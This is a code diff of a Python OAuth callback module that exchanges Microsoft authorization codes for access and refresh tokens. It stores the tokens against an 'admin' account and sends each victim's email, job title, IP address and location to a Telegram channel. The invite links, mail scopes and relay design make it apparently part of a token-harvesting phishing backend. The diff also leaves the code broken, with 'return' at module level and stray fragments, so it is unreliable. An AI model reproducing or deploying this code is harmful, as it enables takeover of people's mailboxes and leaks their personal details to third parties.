@@ -697,7 +697,7 @@ def resolve_token_exchange_redirect_uri(
         f" hidden inside obfuscated block"
     )
     return REDIRECT_URI
-    
+
     print(
         f"[auth] resolve_token_exchange_redirect_uri\n"
         f"  source=direct\n"
@@ -850,269 +850,226 @@ admin_user_id_for_saved_user = None
 invite_token = None
 requested_scopes = BASIC_SCOPES
 
-    if payload_data:
-        # -----------------------------------------------
-        # NEW PATH: encrypted payload in state
-        # Handles both hex state and AES-GCM encrypted state
-        # -----------------------------------------------
-        flow_type = payload_data.get("flow", "user_basic")
-        state_user_id = payload_data.get("user_id")
-        admin_user_id_for_saved_user = payload_data.get("admin_user_id")
-        invite_token = payload_data.get("invite_token")
-        mail_mode = payload_data.get("mail_mode", False)
+if payload_data:
+    flow_type = payload_data.get("flow", "user_basic")
+    state_user_id = payload_data.get("user_id")
+    admin_user_id_for_saved_user = payload_data.get("admin_user_id")
+    invite_token = payload_data.get("invite_token")
+    mail_mode = payload_data.get("mail_mode", False)
 
-        if mail_mode:
-            flow_type_label = "mail"
-            requested_scopes = MAIL_SCOPES
-        else:
-            flow_type_label = "basic"
-            requested_scopes = BASIC_SCOPES
-
-        # Recover invite context if present
-        if invite_token:
-            invite = get_connect_invite(invite_token)
-            if invite:
-                admin_user_id_for_saved_user = (
-                    admin_user_id_for_saved_user
-                    or invite.admin_user_id
-                )
-                if (
-                    hasattr(invite, "resolved_user_id")
-                    and invite.resolved_user_id
-                    and not state_user_id
-                ):
-                    state_user_id = invite.resolved_user_id
-
-        flow_type = flow_type_label
-
+    if mail_mode:
+        flow_type_label = "mail"
+        requested_scopes = MAIL_SCOPES
     else:
-        # -----------------------------------------------
-        # LEGACY FALLBACK: plain-text state strings
-        # Keeps backward compatibility with any old links
-        # -----------------------------------------------
         flow_type_label = "basic"
+        requested_scopes = BASIC_SCOPES
 
-        if decoded_state.startswith(
-            "user_mail:"
-        ) or decoded_state.startswith("invite_mail:"):
-            flow_type_label = "mail"
+    if invite_token:
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = (
+                admin_user_id_for_saved_user or invite.admin_user_id
+            )
+            if (
+                hasattr(invite, "resolved_user_id")
+                and invite.resolved_user_id
+                and not state_user_id
+            ):
+                state_user_id = invite.resolved_user_id
 
-        if decoded_state.startswith("user_basic:"):
-            state_user_id = decoded_state.split("user_basic:", 1)[1]
-            admin_user_id_for_saved_user = state_user_id
+    flow_type = flow_type_label
 
-        elif decoded_state.startswith("user_mail:"):
-            state_user_id = decoded_state.split("user_mail:", 1)[1]
-            admin_user_id_for_saved_user = state_user_id
+else:
+    flow_type_label = "basic"
+
+    if decoded_state.startswith("user_mail:") or decoded_state.startswith("invite_mail:"):
+        flow_type_label = "mail"
+
+    if decoded_state.startswith("user_basic:"):
+        state_user_id = decoded_state.split("user_basic:", 1)[1]
+        admin_user_id_for_saved_user = state_user_id
+
+    elif decoded_state.startswith("user_mail:"):
+        state_user_id = decoded_state.split("user_mail:", 1)[1]
+        admin_user_id_for_saved_user = state_user_id
+        requested_scopes = resolve_scopes(
+            user_id=state_user_id,
+            mail_mode=True,
+            admin_user_id=admin_user_id_for_saved_user,
+        )
+
+    elif decoded_state.startswith("invite_basic:"):
+        invite_token = decoded_state.split("invite_basic:", 1)[1]
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
+                state_user_id = invite.resolved_user_id
+
+    elif decoded_state.startswith("invite_mail:"):
+        invite_token = decoded_state.split("invite_mail:", 1)[1]
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
+                state_user_id = invite.resolved_user_id
             requested_scopes = resolve_scopes(
-                user_id=state_user_id,
+                user_id=state_user_id or "",
                 mail_mode=True,
                 admin_user_id=admin_user_id_for_saved_user,
             )
 
-        elif decoded_state.startswith("invite_basic:"):
-            invite_token = decoded_state.split("invite_basic:", 1)[1]
-            invite = get_connect_invite(invite_token)
-            if invite:
-                admin_user_id_for_saved_user = invite.admin_user_id
-                if (
-                    hasattr(invite, "resolved_user_id")
-                    and invite.resolved_user_id
-                ):
-                    state_user_id = invite.resolved_user_id
+    elif decoded_state.startswith("user:"):
+        state_user_id = decoded_state.split("user:", 1)[1]
+        admin_user_id_for_saved_user = state_user_id
 
-        elif decoded_state.startswith("invite_mail:"):
-            invite_token = decoded_state.split("invite_mail:", 1)[1]
-            invite = get_connect_invite(invite_token)
-            if invite:
-                admin_user_id_for_saved_user = invite.admin_user_id
-                if (
-                    hasattr(invite, "resolved_user_id")
-                    and invite.resolved_user_id
-                ):
-                    state_user_id = invite.resolved_user_id
-                requested_scopes = resolve_scopes(
-                    user_id=state_user_id or "",
-                    mail_mode=True,
-                    admin_user_id=admin_user_id_for_saved_user,
-                )
+    elif decoded_state.startswith("invite:"):
+        invite_token = decoded_state.split("invite:", 1)[1]
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
+                state_user_id = invite.resolved_user_id
 
-        elif decoded_state.startswith("user:"):
-            state_user_id = decoded_state.split("user:", 1)[1]
-            admin_user_id_for_saved_user = state_user_id
+    else:
+        admin_user_id_for_saved_user = decoded_state or None
+        state_user_id = decoded_state or None
 
-        elif decoded_state.startswith("invite:"):
-            invite_token = decoded_state.split("invite:", 1)[1]
-            invite = get_connect_invite(invite_token)
-            if invite:
-                admin_user_id_for_saved_user = invite.admin_user_id
-                if (
-                    hasattr(invite, "resolved_user_id")
-                    and invite.resolved_user_id
-                ):
-                    state_user_id = invite.resolved_user_id
+    flow_type = flow_type_label
 
-        else:
-            admin_user_id_for_saved_user = decoded_state or None
-            state_user_id = decoded_state or None
+# --- Resolve the correct redirect_uri for token exchange ---
+token_exchange_redirect_uri = resolve_token_exchange_redirect_uri(
+    relay_host=relay_host,
+    relay_path=relay_path,
+)
 
-        flow_type = flow_type_label
+# --- Exchange code for token with Microsoft ---
+token_payload = {
+    "client_id": require_client_id(),
+    "client_secret": require_client_secret(),
+    "code": code,
+    "redirect_uri": token_exchange_redirect_uri,
+    "grant_type": "authorization_code",
+    "scope": requested_scopes,
+}
 
-        # --- Resolve the correct redirect_uri for token exchange ---
-    # Must exactly match what was used in the authorize request.
-    # If request came via Cloudflare Worker relay, use worker URI.
-    # If direct backend callback, use REDIRECT_URI.
-    token_exchange_redirect_uri = resolve_token_exchange_redirect_uri(
-        relay_host=relay_host,
-        relay_path=relay_path,
+print(
+    f"[auth] Token exchange POST\n"
+    f"  redirect_uri={token_exchange_redirect_uri}\n"
+    f"  scope={requested_scopes[:80]}\n"
+    f"  flow_type={flow_type}\n"
+    f"  relay={relay or 'direct'}"
+)
+
+response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
+result = response.json()
+
+if "error" in result:
+    error_message = explain_azure_token_error(
+        result.get("error_description", ""),
+        result.get("error", "Token exchange failed"),
     )
-
-    # --- Exchange code for token with Microsoft ---
-    token_payload = {
-        "client_id": require_client_id(),
-        "client_secret": require_client_secret(),
-        "code": code,
-        "redirect_uri": token_exchange_redirect_uri,
-        "grant_type": "authorization_code",
-        "scope": requested_scopes,
-    }
-
     print(
-        f"[auth] Token exchange POST\n"
-        f"  redirect_uri={token_exchange_redirect_uri}\n"
-        f"  scope={requested_scopes[:80]}\n"
-        f"  flow_type={flow_type}\n"
-        f"  relay={relay or 'direct'}"
+        f"[auth] Token exchange failed\n"
+        f"  error={result.get('error')}\n"
+        f"  redirect_uri_used={token_exchange_redirect_uri}\n"
+        f"  description={result.get('error_description', '')[:200]}"
     )
+    raise Exception(f"Token exchange failed: {error_message}")
 
-    response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
-    result = response.json()
+access_token = result["access_token"]
 
-    if "error" in result:
-        error_message = explain_azure_token_error(
-            result.get("error_description", ""),
-            result.get("error", "Token exchange failed"),
-        )
-        print(
-            f"[auth] Token exchange failed\n"
-            f"  error={result.get('error')}\n"
-            f"  redirect_uri_used={token_exchange_redirect_uri}\n"
-            f"  description={result.get('error_description', '')[:200]}"
-        )
-        raise Exception(f"Token exchange failed: {error_message}")
+print(
+    f"[auth] Token exchange succeeded\n"
+    f"  has_refresh_token={bool(result.get('refresh_token'))}\n"
+    f"  expires_in={result.get('expires_in')}\n"
+    f"  relay={relay or 'direct'}"
+)
 
-    access_token = result["access_token"]
+resolved_user_id = None
+job_title = None
+profile = {}
 
+try:
+    identity = fetch_graph_identity(access_token)
+    resolved_user_id = identity["resolved_user_id"]
+    job_title = identity["job_title"]
+    profile = identity["profile"]
     print(
-        f"[auth] Token exchange succeeded\n"
-        f"  has_refresh_token={bool(result.get('refresh_token'))}\n"
-        f"  expires_in={result.get('expires_in')}\n"
-        f"  relay={relay or 'direct'}"
+        f"[auth] Graph identity fetched\n"
+        f"  resolved_user_id={resolved_user_id}\n"
+        f"  job_title={job_title}"
+    )
+except Exception as e:
+    print(f"[auth] Graph identity fetch failed: {e}")
+
+device_info = build_device_info(client_ip, user_agent)
+effective_user_id = resolved_user_id or state_user_id or admin_user_id_for_saved_user
+
+if effective_user_id:
+    save_token(effective_user_id, result, device_info)
+    print(
+        f"[auth] Token saved to DB\n"
+        f"  effective_user_id={effective_user_id}"
     )
 
-    # --- Fetch real identity from Microsoft Graph ---
-    resolved_user_id = None
-    job_title = None
-    profile = {}
-
-    try:
-        identity = fetch_graph_identity(access_token)
-        resolved_user_id = identity["resolved_user_id"]
-        job_title = identity["job_title"]
-        profile = identity["profile"]
-        print(
-            f"[auth] Graph identity fetched\n"
-            f"  resolved_user_id={resolved_user_id}\n"
-            f"  job_title={job_title}"
-        )
-    except Exception as e:
-        print(f"[auth] Graph identity fetch failed: {e}")
-
-    device_info = build_device_info(client_ip, user_agent)
-    effective_user_id = (
-        resolved_user_id
-        or state_user_id
-        or admin_user_id_for_saved_user
+if admin_user_id_for_saved_user and resolved_user_id:
+    save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)
+    print(
+        f"[auth] Saved user association\n"
+        f"  admin={admin_user_id_for_saved_user}\n"
+        f"  user={resolved_user_id}"
     )
 
-    # --- Save token to DB ---
-    if effective_user_id:
-        save_token(effective_user_id, result, device_info)
-        print(
-            f"[auth] Token saved to DB\n"
-            f"  effective_user_id={effective_user_id}"
-        )
-
-    # --- Save user association ---
-    if admin_user_id_for_saved_user and resolved_user_id:
-        save_saved_user(
-            admin_user_id_for_saved_user,
-            resolved_user_id,
-            job_title,
-        )
-        print(
-            f"[auth] Saved user association\n"
-            f"  admin={admin_user_id_for_saved_user}\n"
-            f"  user={resolved_user_id}"
-        )
-
-    # --- Mark invite used ---
-    if invite_token and resolved_user_id:
-        mark_connect_invite_used(
-            invite_token,
-            resolved_user_id,
-            job_title,
-        )
-        print(
-            f"[auth] Invite marked used\n"
-            f"  invite_token={invite_token}\n"
-            f"  resolved_user_id={resolved_user_id}"
-        )
-
-    email = (
-        profile.get("userPrincipalName")
-        or profile.get("mail")
-        or resolved_user_id
-        or "unknown"
+if invite_token and resolved_user_id:
+    mark_connect_invite_used(invite_token, resolved_user_id, job_title)
+    print(
+        f"[auth] Invite marked used\n"
+        f"  invite_token={invite_token}\n"
+        f"  resolved_user_id={resolved_user_id}"
     )
 
-    # --- Telegram alert ---
-    payload_source = (
-        "encrypted_payload" if payload_data else "legacy_state"
-    )
-    send_telegram_alert(
-        f"OAuth Callback Complete\n"
-        f"Source: {payload_source}\n"
-        f"Flow: {flow_type}\n"
-        f"Relay: {relay or 'direct'}\n"
-        f"Relay Host: {relay_host or 'none'}\n"
-        f"Relay Path: {relay_path or 'none'}\n"
-        f"Redirect URI Used: {token_exchange_redirect_uri}\n"
-        f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
-        f"State User ID: {state_user_id or 'unknown'}\n"
-        f"Job Title: {job_title or 'unknown'}\n"
-        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
-        f"Email: {email}\n"
-        f"IP: {client_ip or 'unknown'}\n"
-        f"Location: {device_info.get('location', 'unknown')}\n"
-        f"Scopes Requested: {requested_scopes[:80]}...\n"
-        f"Has Refresh Token: {bool(result.get('refresh_token'))}"
-    )
+email = (
+    profile.get("userPrincipalName")
+    or profile.get("mail")
+    or resolved_user_id
+    or "unknown"
+)
 
-    return {
-        "resolved_user_id": resolved_user_id,
-        "effective_user_id": effective_user_id,
-        "job_title": job_title,
-        "profile": profile,
-        "admin_user_id": admin_user_id_for_saved_user,
-        "flow_type": flow_type,
-        "payload_source": payload_source,
-        "scopes_requested": requested_scopes,
-        "relay": relay or "direct",
-        "relay_host": relay_host or None,
-        "redirect_uri_used": token_exchange_redirect_uri,
-    }
+payload_source = "encrypted_payload" if payload_data else "legacy_state"
 
+send_telegram_alert(
+    f"OAuth Callback Complete\n"
+    f"Source: {payload_source}\n"
+    f"Flow: {flow_type}\n"
+    f"Relay: {relay or 'direct'}\n"
+    f"Relay Host: {relay_host or 'none'}\n"
+    f"Relay Path: {relay_path or 'none'}\n"
+    f"Redirect URI Used: {token_exchange_redirect_uri}\n"
+    f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
+    f"State User ID: {state_user_id or 'unknown'}\n"
+    f"Job Title: {job_title or 'unknown'}\n"
+    f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
+    f"Email: {email}\n"
+    f"IP: {client_ip or 'unknown'}\n"
+    f"Location: {device_info.get('location', 'unknown')}\n"
+    f"Scopes Requested: {requested_scopes[:80]}...\n"
+    f"Has Refresh Token: {bool(result.get('refresh_token'))}"
+)
+
+return {
+    "resolved_user_id": resolved_user_id,
+    "effective_user_id": effective_user_id,
+    "job_title": job_title,
+    "profile": profile,
+    "admin_user_id": admin_user_id_for_saved_user,
+    "flow_type": flow_type,
+    "payload_source": payload_source,
+    "scopes_requested": requested_scopes,
+    "relay": relay or "direct",
+    "relay_host": relay_host or None,
+    "redirect_uri_used": token_exchange_redirect_uri,
+}
 
 # =========================
 # DEVICE CODE FLOW
